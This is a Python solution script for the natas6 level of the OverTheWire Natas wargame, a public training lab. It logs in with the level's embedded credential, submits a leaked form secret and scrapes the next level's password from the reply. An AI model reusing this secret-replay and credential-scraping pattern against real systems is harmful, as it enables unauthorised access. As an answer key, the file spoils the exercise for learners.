#!/usr/bin/env python3

import requests
import re

username = 'natas6'
password = 'aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1'

url = 'http://%s.natas.labs.overthewire.org/' % username

session = requests.Session()

response = session.post(url, data = {"secret": "FOEIUWGHFEEUHOFUOIU", "submit": "submit" }, auth = (username, password))
content = response.text

print(re.findall('natas7 is (.*)', content)[0])